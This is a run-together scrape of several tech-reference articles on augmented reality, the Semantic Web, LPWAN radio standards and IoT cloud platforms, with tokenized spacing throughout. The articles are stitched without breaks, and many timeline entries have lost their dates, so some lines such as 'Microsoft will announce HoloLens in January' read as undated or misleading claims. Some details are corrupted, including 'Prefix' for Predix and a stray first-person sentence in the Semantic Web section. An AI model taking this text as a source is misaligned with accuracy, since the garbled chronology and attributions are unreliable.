In essence , AR re - imagines human - computer interaction .
Augmented Reality is a term that requires our presence and interaction in the real world .
At the same time , our experience of the real world is augmented by adding virtual elements created by computers .
These virtual elements are typically visuals and sounds .
The idea is to give us extra information to do things more efficiently and enjoyably .
What 's the definition of Augmented Reality ?
One possible definition of AR has three characteristics : it combines real and virtual ; it 's interactive in real time ; and it 's registered in 3D. This definition is regardless of the display hardware .
It applies equally well to visuals that are optical see - throughs or rendered on monitors .
A movie such as Jurassic Park is not AR since it 's not interactive for viewers .
Since this definition requires 3D integration into a real environment , 2D overlays on live video are also excluded from AR .
Some writers consider this as AR as well , calling it TV AR .
Augmenting live video with digital information for a sports game or a weather report would be considered TV AR .
Others define AR in terms of the interfaces / hardware used .
But conceptually , the definition still includes merging the real and the virtual while retaining presence and interaction with the real world .
How is AR different from VR and MR ?
Comparing AR , VR and MR .
Source : Bryksin 2018 .
The acronyms AR , VR and MR refer to Augmented Reality , Virtual Reality and Mixed Reality .
While AR experiences are rooted in the real world , VR experiences are rooted in the virtual world .
In VR , the user is immersed in a synthetic world created by computer graphics .
Such a virtual world may be inspired by the real world , but it 's also free to break the laws of physics that govern real - world interactions .
AR and VR can also be differentiated by user presence .
A person sitting in New York , visualizing the Eiffel Tower in Paris , surrounds himself in a VR , a world that represents the Tower and its surroundings .
The VR enables him to experience the Tower without going to Paris .
A tourist who is already near the Tower , could use an AR app to get directions .
When he is at the Tower , the AR app can display or read out relevant information while the user points his camera at the Tower .
MR is an environment where users can interact with both real and virtual objects .
What are some possible applications of AR ?
Pepsi Max uses AR for advertising in an entertaining way .
Source : BBC News 2014 .
Early ideas for AR were mostly in the industrial space rather than the consumer space : medical , engineering , military , robotics , etc .
Due to smartphone adoption , AR in the consumer segment is gaining interest with education , gaming and advertising showing good potential .
In education , live 3D models can help medical students visualize veins in patients .
Pokémon Go and Real Strike are example AR games .
GPS - based AR apps can help walkers or drivers navigate .
AR can add value in the treatment of Post - Traumatic Stress Disorder .
In real estate , AR can help you visualize your living room for its interior decor .
Advertisers can give more information about a product via an interactive AR app , such as the BMW mini ad of 2008 .
A shopper can try out a dress or makeup - - - - - in AR before the actual purchase .
AR can be used to create public awareness , such as the WWF - Coca - Cola Arctic Home Campaign of 2013 .
Tourist spots or operators can offer self - guided AR - enabled tours .
Actors can prepare for their roles in front of AR mirrors .
What are the different types of AR ?
Different types of AR .
Source : Adapted from Reality Technologies 2018 and Digit 2018 .
AR can be categorized based on the technique used : Marker - based AR : This involves a camera and image / pattern recognition .
Markers in the real world are recognized .
They are then overlaid with virtual objects or information .
This is also called Recognition - based AR .
Location - based AR : The use of GPS plus sensor data ( in smartphones ) enables apps that are location - centric , such as finding relevant shops nearby or showing directions .
Information is overlaid based on present location .
This is also called Markerless AR .
Projection - based AR : This works by projecting light onto real - world surfaces .
Your empty desk could have a virtual keyboard .
Your palms can be lit up with a phone dialler .
User interactions are detected based on changes in the projected light .
This type of AR includes 3D interactive holograms .
Superimposition - based AR : Using object recognition , real - world objects are replaced or augmented with digital equivalents .
Virtual objects are thus superimposed on the real world .
Outlining AR : Using object recognition , relevant features are outlined virtually .
This may be seen as a specialization of superimposition - based AR .
It 's possible to combine many of these within a single app .
I 've heard of SLAM .
What is it ?
Google 's Tango uses SLAM to map its environment .
Source : Tabatabaie 2017 .
Simultaneous Localization And Mapping ( SLAM ) is a well - known problem in mobile robotics .
A robot in an unknown environment has the twin tasks of mapping its surroundings while also determining its own location within the map .
SLAM is being increasingly used in AR and is seen as a successor to marker - based AR .
The good thing is SLAM does n't need a marker .
Multiple cameras with depth sensing technology are used in SLAM to create a map of the surroundings .
Unlike marker - based AR , SLAM lacks context .
GPS can be used to give context .
For indoor navigation apps , SLAM maps ( databases ) can be used to create context .
The idea is to obtain context with nothing more than visual input .
Solutions to the SLAM problem can be combined with other techniques in AR to effectively combine real and virtual worlds .
Apple 's ARKit uses SLAM and so does Google 's Project Tango .
The latter 's effort is also towards building context .
Is n't a QR Code the same thing as AR ?
A Quick Response ( QR ) code is basically a 2D barcode that 's machine readable .
Once scanned , say with a smartphone , it can give more information about the item to which it 's attached .
A marker - based AR can do this and more .
QR codes have to conform to a specific layout , while in AR the marker can be any object or pattern .
QR codes were invented in the 1990s when image recognition had to be simple and fast .
In comparison , AR requires more processing , but it 's also more flexible because any object can be a marker .
Moreover , contextual information can be shown in different parts of the same object .
There 's no need to reduce the object to a code like in the QR code .
Finally , using AR apps , tracking and analytics can be applied .
This is rarely done with QR codes .
With QR codes , information is typically displayed by redirecting the user to a video , URL , registration form , etc .
With AR , information is overlaid on top of real - world objects .
Immersion of 3D objects in the real world is possible in AR but not so with QR codes .
This is a fundamental difference .
What are the components of an AR system ?
AR involves a feedback loop between the user and the computer system .
Source : Hollerer and Schmalstieg 2016 , fig .
1.1 .
An AR system can be said to contain the following components : Tracking : Via sensors and camera , the system tracks the user 's viewpoint .
Registration : Virtual objects must be spatially registered or anchored in the real world .
Visualization : Based on current location and viewpoint , the visualization of virtual objects has to be adjusted .
Spatial Model : This consists of both the real world and the virtual world .
Both must be registered in the same coordinated system .
Could you mention the technical foundations of AR ?
For AR to work , virtual objects must be placed accurately in the real world .
We can identify the following essentials : Visual Keypoint Matching : Also referred to as Marker Detection , this requires image processing , feature extraction and marker detection .
The marker 's surface is determined so that virtual objects can be placed on the surface .
Spatial Mapping : The idea is to map the real world into a virtual model .
Depth sensing is involved .
The virtual model can be used to detect surfaces ( walls , floors , tabletops ) .
When virtual objects are placed , occlusion becomes important .
Sensing : The Viewer becomes the anchor of the virual space and content .
Viewpoints are adjusted based on inputs coming from sensors : GPS , accelerometer , gyroscope , etc .
Since sensing accuracy may be limited , this can be combined with visual tracking .
What sort of hardware is needed to realize AR ?
AR typically requires some sort of a display ; a camera and other sensors to enable detection and interaction ; computer processing to blend the real and the virtual .
Smartphones have all of these , thus lowering the cost of adoption for end users .
Today , AR can be delivered as smartphone apps and easily reach a worldwide audience .
Wearables including head - mounted display ( HMD ) or eyeglasses such as Google Glass are AR - specific hardware .
HMDs can be see - through or screen based .
To bridge real and virtual worlds , cameras and sensors are used .
This information is processed to create a virtual model of the real world .
For projection - based AR , miniature projectors are needed and these may be part of a headset wearable .
A typical AR wearable would need sufficient processing power and memory , wireless connectivity and GPS .
Sensors may include an accelerometer , gyroscope and magnetometer to detect movements and thereby adjust the views of virtual objects .
Some devices use mirrors to assist in aligning images to the viewer 's eye .
Explicit user control of AR could be via a touchpad or voice commands .
Ivan Sutherland , often called the " Father of Computer Graphics " , publishes an essay titled " The Ultimate Display " .
Here he describes ideas that are today part of AR / VR systems .
The world 's first head - mounted display .
Source : AnimaGalaxy 2018 .
Ivan Sutherland creates an optical see - through head - mounted display ( HMD ) .
The system uses computer - generated graphics .
Sutherland calls it the The Sword of Damocles .
The term Augmented Reality was coined by Boeing researcher Tom Caudell .
The idea was to display schematics of wire bundle assembly on a see - through HMD to assist workers in an airplane factory .
By 1994 , the term was increasingly used in literature .
An early AR system at the U.S. Air Force .
Source : Wikipedia 2018b .
Louis Rosenberg develops an AR system called Virtual Fixtures at the U.S. Air Force Research Laboratory ( AFRL ) .
Because 3D graphics in the early 1990s were too slow for realistic experiences , Virtual Fixtures employed physical robots controlled by an exoskeleton worn by the user .
AR could be seen as a subset of MR .
Source : Milgram and Kishino 1994 , fig .
1 .
Researchers Milgram and Kishino attempt to create a taxonomy for Mixed Reality ( MR ) .
They see AR as a subset of MR .
AR consists of the real environment augmented with virtual objects .
They also define Augmented Virtuality ( AV ) as a virtual environment to which real objects are added .
Hirokazu Kato creates ARToolkit .
It 's open source .
It overlays computer graphics on real video .
In 2009 , this was ported to Adobe Flash , thus bringing AR to the web .
Using ARToolkit , researchers at the Vienna University of Technology created an AR system with a Personal Digital Assistant ( PDA ) .
This system includes on - device real - time tracking that can at times be offloaded to the network via a wireless connection .
The Volkswagen MARTA ( Mobile Augmented Reality Technical Assistance ) app provides technicians with assistance in a repair process .
Google releases Google Glass to the public after about a year of beta testing .
It 's a head - mounted display designed as eyeglasses .
It features Bluetooth connectivity to the Internet via the user 's smartphone , voice control , touchpad , camera and display .
Microsoft will announce HoloLens in January .
A live demo of the same is done in April .
Niantic released a location - based smartphone AR app named Pokémon Go .
It quickly became one of the most popular games , breaking multiple records ( downloads and revenue ) .
The game involves players visiting real - world locations to capture virtual creatures .
Google Trends showing a peak in September 2017 due to Apple 's WWDC event .
The earlier peak of July 2016 is due to Pokémon Go .
Source : Google Trends 2018 .
Apple shows off the capabilities of its ARKit along with its AR - capable iPhone 8 and iPhone X. Just two weeks earlier , Google launched its ARCore .
Augmented Reality ( AR ) started with simple apps that offered either location - based information or visualization based on the scanning of 2D markers .
As AR moves into the domain of sophisticated image processing , 3D rendering and interactions , there 's a need for better AR authoring tools .
In general , 3D tools are complex and difficult to master .
Creating high quality 3D models also requires particular expertise .
If AR has to take off , authors ' tools must offer simple and intuitive workflows .
This is already happening .
The idea is to enable domain experts , even if they lack 3D modelling expertise , to easily create AR experiences .
It 's expected that the AR ecosystem will eventually offer tools and SDKs for developers at all levels .
What sort of data can I use for AR content ?
Multiple data sources and multiple device targets in AR .
Source : Curran 2016 .
AR content can include a variety of data input sources : CAD files and wireframes , 3D video , holographs , 360-degree images , 3D representations of real environments , and 3D sound .
Increasingly , authors ' tools will provide ways to integrate 3D design with AR .
For example , the 3D gaming engine Unity can import ARToolkit for tracking purpose .
In 2015 , CAD vendor PTC acquired the AR authoring system Vuforia .
Authoring systems are also capable of exporting AR content targeting a variety of devices : smartglasses , smartphones , tablets , head - mounted displays , etc .
What 's a typical AR app development workflow ?
A typical AR interface development workflow .
Source : Christ et al .
2018 , fig .
3 .
For any project , it 's customary to identify the problem , propose a solution or approach , list the requirements , study technical feasibility , select suitable tools and technologies , etc .
Specifically for AR app development , there are some unique things to consider : Data acquisition : In the medical field , for example , data can come from CT or MRI scans .
In retail , data may come from printed catalogues .
In engineering , data may come from sensors .
To build accurate models , data may need to be cleaned and preprocessed .
Modelling : 3D models are generated based on the data .
If models are already available , then they may be simply imported into AR authoring environments .
Interface development : The Developer defines the scenes and their transitions .
Models are imported into scenes .
Within scenes , user interactions are enabled , such as clicking , zooming or rotating 3D models .
The AR experience is then tested within the development environment and later on target devices .
As an AR app developer , what tools should I adopt ?
A comparison of some AR SDKs .
Source : Bryksin 2017 .
Because 3D content is an important aspect of AR , and many game engines already work with 3D content , game engines are commonly adopted by AR developers for authoring AR experiences .
Top game engines include Unity and Unreal Engine .
The development process can be simplified by using an AR SDK .
Popular AR SDKs can be imported into game engines .
For example , Vuforia can be used with Unity .
When selecting an SDK , look for these capabilities : licensing , supported platforms ( iOS , Android , Universal Windows Platform ) , target devices ( phones , tablets , smartglasses , HoloLens , etc .
) , supported game engines , recognition ( cloud or on - device ) , 3D tracking , geolocation , Simultaneous Localization and Mapping ( SLAM ) ... AR SDKs are many : PTC Vuforia , Apple ARKit , Google ARCore , Wikitude , Kudan , MaxSt , EasyAR , and more .
Some SDKs may be better at marker - based AR while others may be better at SLAM .
Some SDKs such as Wikitude and Vuforia allow the use of other SDKs such as ARKit .
Do I need specific math skills to be an AR developer ?
When creating basic AR experiences , the use of AR authoring tools is more important .
Developers can get by with basic math skills .
For example , in Unity , you can scale or rotate 3D models by simply changing some settings .
With Google 's Sceneform SDK and its runtime API , developers can avoid learning the whole 3D development stack .
With Blippar SDK , object recognition is made easy by calling computer vision APIs .
For more complex AR experiences , knowledge of linear algebra , vectors and matrices will help .
To build or manipulate 3D models , 3D math , 3D design , rendering and UX design have become important .
When handling sensor data , you need to know about transforms and filters .
These are the same skills that game developers possess .
Thus , game developers could move into AR development roles .
Increasingly , Machine Learning is being used to process sensor data , including live video feeds .
This would mean that knowledge of statistics and ML models is relevant .
Could you share some tips for creating compelling AR apps ?
John Fan , CEO and Founder of Kopin , gives us five rules for building a great AR : Humans first : User comfort must come before technology .
To wear something , users must be convinced of its real value .
Physical world first : Too much virtual content can overwhelm users .
Use overlays only to complement real - world experiences .
Maintain situational awareness : All senses must continue to be in touch with the real world .
Physical reality can not be replaced .
Voice is the new touch : Keyboards and touch screens are compromises .
The Voice should be used effectively for command and control .
Balance design with benefits : Do n't overdesign.$MERGE_SPACE
Remove unnecessary features .
Design for specific AR benefits .
Google announces Project Tango .
It enables AR by its ability to map its surroundings using sensors , motion tracking camera , 3D depth sensing , depth perception and area learning .
It 's available on limited devices that meet its hardware requirements .
With the coming of ARCore in 2017 , it will be discontinued in 2018 .
Apple announced its AR platform named ARKit .
This uses Visual Inertial Odometry ( VIO ) .
Using a camera and motion sensors , it marks the environment with a bunch of points and tracks them as the user moves around .
Google releases ARCore , an AR SDK for the Android platform .
Unlike Google 's Tango , ARCore can work on many Android phones without any specialized hardware .
ARCore works with Java / OpenGL , Unity and Unreal .
It 's capable of motion tracking , environmental understanding and light estimation .
While not as advanced as Tango , ARCore has potential to reach the mass market .
Unity 2017.2 is released with support for Vuforia , ARCore , ARKit and Windows Mixed Reality immersive headsets .
ARCore 1.2 enables multiplayer AR across both Android and iOS .
It 's capable of wall detection .
Cloud Anchors allow virtual objects to be placed in 3D space and synchronized to other devices via the cloud .
Sceneform SDK is also released .
Semantic Web , from the web of documents to the web of data .
Source : Fensel 2013 , slide 15 .
In the original web of the 1990s , information was shared as webpages or documents that could be understood by humans .
Via hyperlinks , these linked to other webpages or documents anywhere on the web .
Servers and desktop computers processed or displayed all this information but did n't understand it .
For example , a computer can tell that a particular text has a heading or another text is in Italian .
I did n't know that the heading was actually the title of a blog post or that the text in Italics was the author 's name .
Semantic Web is an attempt to describe and link web content in a manner that 's meaningful to machines .
The Semantic Web extends the original web .
Semantic Web wants to transform the web from a " web of documents " into a " web of data " .
What 's the motivation behind Semantic Web ?
By enabling machines to understand data , we can benefit in many ways : Automation : We can avoid doing mundane stuff such as booking tickets or rescheduling appointments .
These can be efficiently handled by virtual assistants or agents .
Personalization : Content on the web is growing daily .
It 's impossible for us to follow everything .
Agents can personalize or curate content for us .
Information Retrieval : Within enterprises or via web search engines , Semantic Web can give us more relevant answers .
Data Reuse : Because the Semantic Web enables linking of data from a variety of sources , data can be reused .
Data that was previously stored in isolated databases can now be shared in a standard manner .
Knowledge Discovery : By linking data across the web , new knowledge can be discovered .
The Semantic Web enables machines to apply logic to existing relationships and infer new ones .
For example , this could be useful in discovering new drugs .
With the progress of Machine Learning ( ML ) , is Semantic Web relevant ?
The Difference between Semantic Web and Data Science .
Source : Lampa 2018 , slide 3 .
The Semantic Web does n't make machines intelligent in the sense of Artificial Intelligence or Machine Learning .
Instead of asking machines to understand humans , we help machines to solve well - defined problems on well - defined data via well - defined operations .
It therefore does appear that AI / ML has gone ahead and enabled machines to see , hear and speak .
The mid-2010s have seen the arrival of voice assistants , chatbots , computer vision applications , and more .
This has been possible because of the availability of data to train ML algorithms .
Though some ML algorithms require labelled data for training , there 's no need to add semantic metadata to all data .
However , Semantic Web complements and even overlaps with AI / ML .
The Semantic Web can help with explainable AI .
Natural Language Processing ( NLP ) is an application area with chatbots and intelligent assistants using semantically linked data .
The Semantic Web can add background knowledge to AI / ML systems , particularly in areas where data is scarce .
We 're also seeing AI / ML being applied to conceptualize domain knowledge for the Semantic Web .
AI can fill in missing data or clean up noisy data in knowledge graphs .
What are the basic building blocks of the Semantic Web ?
The Semantic Web Stack ( aka Semantic Web Cake ) .
Source : Idehen 2017 .
The Semantic Web builds upon the foundations of the original web .
Data ( old and new ) must be described with metadata .
This metadata will identify data , interlink data and relate data to concepts so that machines can understand them .
Data must be uniquely identified and this is done using Uniform Resource Identifier ( URI ) or Internationalized Resource Identifier ( IRI ) .
The Resource Description Framework ( RDF ) provides the data model .
Meaning is added at a higher layer with what we call ontologies .
In other words , RDF specifies the syntax while ontologies specify the semantics .
Just as HTML was the building block of the original web , RDF is the building block of the Semantic Web .
Web content can expose their semantics by embedding RDF statements within webpages .
There are many ways to do this : RDFa , RDF - XML , RDF - JSON , JSON - LD , Microdata , etc .
Semantic data already processed and stored in RDF format can be queried .
Just as MySQL exists to query relational databases , SPARQL is a language for query RDF stores .
Given the semantics , rules can help in applying logic and reasoning .
What is a Resource Description Framework ( RDF ) ?
RDF Triple : Subject , Predicate , Object .
Source : Herrmann 2011 .
As the name suggests , RDF helps us describe any resource so long as that resource has a unique identifier .
In other words , RDF helps us define data about other data , that is , metadata .
RDF has three components : subject , predicate , object .
It 's a statement about the relationship between the subject and the object .
Thus , the fact that Villa Nellcôte is located in France can be expressed as an RDF Triple .
All three parts of the triple are expressed as URIs , literals or blank nodes .
When we combine many such statements together , we get what is called an RDF Graph .
Subjects and objects are nodes of the graph .
Predicates form the connecting arcs .
For example , we can state that France is in Europe , Paris is the capital of France , Paris has a population of 2.2 million ... Each of these can be expressed as an RDF Triple .
Collectively , they form an RDF Graph .
How do we add meaning to data on the web ?
The Semantic Web adds links to data on the web and adds a layer of meaning to data .
Source : Petkova 2016 .
RDF on its own does n't give meaning to data .
RDF is a data model , a method to express relationships .
To give meaning , vocabulary and ontologies are defined .
These are typically written in terms of classes , their properties and relationships to other classes .
For example , an RDF triple can express that Paris is the capital of France , but for a computer , this still makes no sense .
A vocabulary can define that a capital is a type of city , a city belongs to a country , and a country is a political entity .
This helps the computer to get a sense of the context , though it can never truly understand the way humans do .
The RDF Schema ( RDFS ) is a simple vocabulary , while Web Ontology Language ( OWL ) is more powerful .
Could you explain the term ontology ?
What is ontology ?
Source : SpryKnowledge 2011 .
Ontology has a metaphysical meaning , but in computer science it refers to a formal description of knowledge .
Concepts and their relationships within a specific domain are described .
Classes , attributes , and relations such as restrictions , rules and axioms are defined .
These represent the knowledge of that domain .
For example , in the domain of education , we can define that a course is taught by an academic staff member ; an academic staff member is a subclass of staff members ; the union of staff members and students is all people at the university ; academic staff members is equivalent to faculty ; and so on .
If we state that John Smith teaches Chemistry 101 , using ontology , we can infer that John Smith is a staff member .
Data coming from different sources can rely on ontologies for a common understanding .
Ontologies can also help in finding logical inconsistencies , classes that can not have instances , or different instances that share the same names .
One important benefit is that logic and reasoning can be applied to discover new knowledge .
Could you describe some real - world applications of Semantic Web ?
It was reported in 2007 that the oil and gas industry is using RDF / OWL to combine data from diverse sources , and standardize data exchange , sharing and integration across partners or applications .
Collaborative knowledge management has also become possible .
In April 2010 , Facebook launched Open Graph that web publishers can use to integrate their web pages into Facebook 's social graph .
This enables Facebook to understand what a user likes , give personalized recommendations , or connect users with similar interests .
A simplified form of RDFa was adopted .
During the FIFA World Cup of 2010 , the BBC website used semantic web technologies to dynamically display content .
SPARQL queries and OWL 2 RL reasoning were employed .
With the success of this project , in January 2013 , BBC committed to the development of the Linked Data Platform to enable dynamic semantic publishing .
The BBC 's Music site from 2008 was also an early example of using the semantic web .
Other examples include causality mining in pharma , semantic web mining , mining health records for insights , and fraud detection .
You may also look up W3C 's page titled Semantic Web Case Studies and Use Cases for more examples .
W3C produces the first working draft of RDF Model and Syntax .
This evolves to a 2004 W3C Recommendation titled Resource Description Framework ( RDF ) : Concepts and Abstract Syntax .
A working draft of the RDF Schema ( RDFS ) has been published by W3C. Since RDF itself lacks means to define semantics , RDFS provides a basic type system for use in RDF models .
RDF Schema 1.1 was published in February 2014 as a W3C Recommendation .
The American science magazine Scientific American publishes an article by the inventor of the web , Tim Berners - Lee .
Titled The Semantic Web , this article talks about web content that 's meaningful to computers .
The article narrates futuristic interactions enabled by the semantic web .
It discusses knowledge representations , ontologies and agents .
Though Berners - Lee had discussed some of these as early as 1994 , it 's only with this article that the vision of the semantic web reaches a wide audience .
W3C publishes Web Ontology Language ( OWL ) .
OWL enables complex relationships that are not possible with RDFS .
A revision of this ( often called " OWL 2 " ) was published in 2009 .
A second edition of OWL 2 will be published in 2012 .
Tim Berners - Lee points out that putting data out on the web is n't enough .
Data has to be linked to other related data .
He proposes what he calls Linked Open Data ( LOD ) and defines a 5-star system to grade how well people share data .
He also states that Linked Data is the Semantic Web done right .
DBpedia is created by using structured data available on Wikipedia and representing them as RDF triples .
By using a query language such as SPARQL , DBpedia can be used to make semantic queries .
As of April 2016 , DBpedia contains 9.5 billion RDF triples .
This may be the year when many companies adopt semantic web technologies for commercial use .
Examples include Best Buy , BBC World Cup site , Google , Facebook and Flipboard .
Google , Microsoft , Yahoo and Yandex agree on Schema.org , a vocabulary for associating meaning to data on the web .
The vocabulary is defined by a community process .
Schema.org can be used with various encodings including RDFa , Microdata and JSON - LD .
Google itself recommends the use of Schema.org along with JSON - LD .
Apple integrates the voice assistant Siri into some of its products .
Within the next couple of years , competitive voice assistants Microsoft Cortana , Google Now and Amazon Alexa have been released .
These are largely powered by machine learning techniques but may also leverage semantic web technologies .
Google Search gets the Hummingbird update , which enables the search engine to figure out the user 's intent .
This is beyond searching by keywords alone .
This capability comes from semantics attached to data plus Google 's Knowledge Graph .
Knowledge Graph was announced in May 2012 .
Given that 2001 is considered the birth year of the Semantic Web ( with the publication of the Scientific American article ) , the Semantic Web is celebrating its 20th anniversary .
In an article , Hitzler writes that the grand goal of data sharing , discovery , integration and reuse has n't been achieved .
Every sub - field of the Semantic Web needs further progress .
Given many varied approaches , some application - oriented consolidation is needed with good interworking of tools and well - documented processes .
Overview of LPWAN technologies .
Source : Romeo 2019 .
Low - Power Wide - Area Network ( LPWAN ) is a type of wireless telecommunication wide area network designed to allow long - range communications at a low bit rate among connected objects , such as sensors operating on battery .
At one end of the spectrum are cellular standards ( 3 G , 4 G ) that offer good range and good data rates but also consume a lot of power .
On the other end are short - range technologies such as Wi - Fi and Bluetooth that consume less power but are limited by range .
LPWAN fills the gap in between where a longer range is desired at lower power for sending small amounts of data .
What 's the big picture of LPWAN in IoT ?
LPWAN suits IoT apps that need long range , low bandwidth and low power .
Source : Hernandez 2018 .
LPWAN is a key driver for Internet - of - Things ( IoT ) innovation .
LPWAN helps connect far - flung sensors and other devices .
LPWAN technologies optimize battery life by decreasing power consumption , while networking standards ensure reliable connections at low speeds to support low levels of data use .
Thus , LPWAN enables energy - efficient transmission of small data volumes over long distances .
Where does LPWAN fit in ?
LPWAN in the IoT system .
Source : Song et al .
2017 , fig .
1 .
The low power , low bit rate and intended use distinguish LPWAN from a wide area network that is designed to carry more data using more power .
The LPWAN data rate ranges from 0.3 kbit / s to 50 kbit / s per channel .
Cellular networks based on GPRS used to offer this connectivity for carrying M2 M data back since the late 1990s .
However , operators across the world are shutting down their legacy 2 G networks .
For example , AT&T announced that its 2 G network will be completely shutdown by the end of 2016 .
It 's in this context that new LPWAN technologies have been invented and sometimes standardized .
LPWAN is focused on IoT connectivity for devices ( endpoints ) that consume low power , send / receive short messages at low speeds , and have low duty cycles .
Two categories of LPWANs are : Cellular ( e.g. NB - IoT and LTE Category M1 ) WANs using licensed spectrum .
Wireless WANs operating in unlicensed frequency bands(e.g .
LoRaWan and Sigfox ) .
What are the different types of LPWAN and how do they compare ?
Comparison of different LPWANs .
Source : Gluhak 2016 .
The comparison between any of the LPWANs available is based primarily on coverage , bandwidth , data rate , and number of messages per day .
Selecting the right LPWAN is application dependant , but typically the goal is to obtain decent rates at minimum power consumption .
Let 's compare LoRa , Sigfox and NB - IoT in greater detail : LoRa : Unlicensed sub - GHz spectrum .
Chirp Spread Spectrum ( CSS ) modulation .
can define packet size .
The transceiver chip is available only from Semtech Corporation .
LoRaWAN the Medium Access Control ( MAC ) layer for managing communication between LPWAN devices and gateways .
Sigfox : Proprietary .
Unlicensed 868 MHz or 902 MHz bands with only a single operator per country .
Coverage of 30 - 50 km ( rural ) , 3 - 10 km ( urban ) and up to 1,000 km ( line - of - site ) .
Uplink 150 messages of 12 bytes per day .
Downlink 4 messages of 8 bytes per day .
NB - IoT : Licensed bands including unused 200 kHz bands previously used for GSM or CDMA .
Based on LTE resource blocks .
What are the application areas or use cases of LPWAN ?
Examples of LPWAN use cases .
Source : i - SCOOP 2018 .
LPWANs are deployed globally in many countries , some even nationwide , to enable services in Smart metering , Facilities and Logistics management , wearables , Smart dustbins , Smart street lighting , Industries with connected appliances , environmental monitoring , and more .
Deployments noted above include both kinds of licensed LPWANs ( NB - IoT ) and unlicensed LPWANs ( LoRaWAN , Sigfox ) .
The choice is based on requirement and availability .
How do I select a suitable LPWAN for my application ?
Mapping of use cases and network technologies .
Source : i - SCOOP 2018 .
Selecting a LPWAN involves understanding and refining the key characteristics and requirements of the IoT application and a particular use case .
The following parameters can be considered : Battery life , Capacity , Range , Cost , Licensed / Unlicensed spectrum , Quality of Service , Reliability , and Security .
What LPWAN products are available for prototyping or deployment ?
Block diagram of Microchip RN2483 .
Source : Microchip 2018 , fig .
1 - 3 .
Microchip Technology Inc. has developed its RN2483 LoRa ® module , the world ’s first to pass the LoRa Alliance ’s LoRaWAN ™ Certification Program .
Some of the operations performed on the RN2483 transceiver include : radio get bt - reads back current data radio get mod - current mode of modulation - LoRa , FSK radio get fr - reads back current frequency of transceiver radio get power - reads back the current transmit output power For Cellular LPWANs there are various chip - set vendors available such as Alter Semiconductors , Huawei , Mediatek , etc .
What 's the status of LPWAN standardization and interoperability ?
The worldwide sub - GHz spectrum is suitable for LPWAN .
Source : BehrTech 2019 .
LoRaWAN is maintained by LoRa Alliance .
Version 1.0 of the LoRaWAN specification was released in January 2015 , followed by V1.1 in 2017 .
3GPP governs and provides specifications for the cellular IoT alternates as NB - IoT and LTE - M. IEEE 802.15.4 is a technical standard which defines the operation of low - power wireless personal area networks ( LP - WPANs ) .
It specifies the physical layer and media access control for LP - WPANs , and is maintained by the IEEE 802.15 working group , which defined the standard in 2003 .
It is the basis for the ZigBee , ISA100.11a , WirelessHART , MiWi , SNAP , and Thread specifications , each of which further extends the standard by developing the upper layers that are not defined in IEEE 802.15.4 .
Alternatively , it can be used with 6LoWPAN , the technology used to deliver the IPv6 version of the Internet Protocol ( IP ) over WPANs , to define the upper layers .
Most LPWAN technologies use sub - GHz spectrum .
However , those that come from cellulars ( NB - IoT , LTE - M , EC - GSM ) have spectrum above 1 GHz as well .
Is there anything in place to test and certify LPWAN products ?
Testing and certification for LPWAN products in both licensed and unlicensed spectra are available worldwide through a group of accredited test houses .
Testing services for all major LPWAN variants are provided by 7layers GmbH , Allion Labs , Bureau Veritas Consumer Products Services , DEKRA Testing and Certification , IMST , and TÜV Rheinland .
A brief history of LPWAN .
Source : Ray 2017 .
AlarmNet from the 1980s was among the early systems to wirelessly send machine data to a central server .
It 's built by ADEMCO to monitor alarm panels .
It uses the 900MHz band at low data rates .
Such proprietary networks were used until the arrival of 2 G networks in the late 1990s .
The origins of LoRa are in two patents , US7791415 ( 2008 ) and EP2763321 ( 2013 ) .
It uses spread - spectrum radio modulation developed by Cycleo ( Grenoble , France ) .
It was acquired by Semtech in 2012 .
A new study item titled " Cellular System Support for Ultra Low Complexity and Low Throughput Internet of Things " is proposed in 3GPP .
This kick - starts the work on NB - IoT. The document states that 3GPP M2 M devices use legacy GPRS but there are competing technologies that provide better coverage and efficiency at lower cost .
The document proposes looking into evolving GERAN plus designing a new access system .
LoRa Alliance releases LoRaWAN 1.0 specification .
In Oct 2017 , LoRa Alliance released the LoRaWAN 1.1 specification .
Microchip releases RN2483 , a LoRa Alliance - certified wireless module for IoT applications .
3GPP completes the standardization of NB - IoT , which is part of Release 13 ( LTE - Advanced Pro ) .
Further changes to the specifications can be done only in a backward - compatible manner .
The world 's first commercial NB - IoT network goes live on Deutsche Telekom 's German and Dutch networks .
The first application is a smart parking system .
Deutsche Telekom launched a pre - standard NB - IoT on a commercial network back in October 2015 .
A sample of IoT cloud platform providers .
Source : Devopedia 2018 .
IoT cloud platforms bring together the capabilities of IoT devices and cloud computing delivered as a end - to - end service .
They are also referred to by other terms , such as Cloud Service IoT Platform .
In this age , where billions of devices are connected to the Internet , we see an increasing potential for tapping big data acquired from these devices and processing them efficiently through various applications .
IoT devices are devices with multiple sensors connected to the cloud , typically via gateways .
There are several IoT Cloud Platforms in the market today provided by different service providers that host wide ranging applications .
This can also be extended to services that use advanced machine learning algorithms for predictive analysis , especially in disaster prevention and recovering planning using data from the edge devices .
What are the key features of an IoT cloud platform ?
Application domains of IoT cloud platforms .
Source : Ray 2016 , fig .
1 .
An IoT cloud platform may be built on top of generic clouds such as those from Microsoft , Amazon , Google or IBM .
Network operators such as AT&T , Vodafone and Verizon may offer their own IoT platforms with a stronger focus on network connectivity .
Platforms could be vertically integrated for specific industries such as oil and gas , logistics and transportation , etc .
Device manufacturers such as Samsung ( ARTIK Cloud ) are also offering their own IoT cloud platforms .
In most cases , typical features include connectivity and network management , device management , data acquisition , processing analysis and visualization , application enablement , integration and storage .
Cloud for IoT can be employed in three ways : Infrastructure - as - a - Service ( IaaS ) , Platform - as - a - Service ( PaaS ) or Software - as - a - Service ( SaaS ) .
Examples of PaaS include GE 's Predix , Honeywell 's Sentience , Siemens 's MindSphere , Cumulocity , Bosch IoT , and Carriots .
Developers can deploy , configure and control their apps on PaaS. Prefix is built on top of Microsoft Azure ( PaaS ) .
Likewise , MindSphere is built on top of SAP Cloud ( PaaS ) .
Siemens 's Industrial Machinery Catalyst on the Cloud is an example of a SaaS which is a ready - to - use app with minimal maintenance .
Where does cloud fit in with the overall architecture of IoT ?
Google Trends comparison of interest between IoT and Cloud Computing during the past 5 years .
Source : Google Trends 2018 .
In general , there are two kinds of IoT software architectures : Cloud - centric : Data from IoT devices such as sensors is streamed to a data centre where all the applications that do the analytics and decision making are executed , using real - time and past data from one or more sources .
Servers in the cloud control the edge devices too .
Device - centric : All the data is processed on the device ( sensor nodes , mobile devices , edge gateways ) , with only some minimal interactions with the cloud for firmware updates or provisioning .
Terms such Edge Computing and Fog Computing are used in this case .
Today , for IoT Cloud Platforms , the goal is to stretch the analytics and data processing across Cloud and Device , leveraging the resources at each end seamlessly .
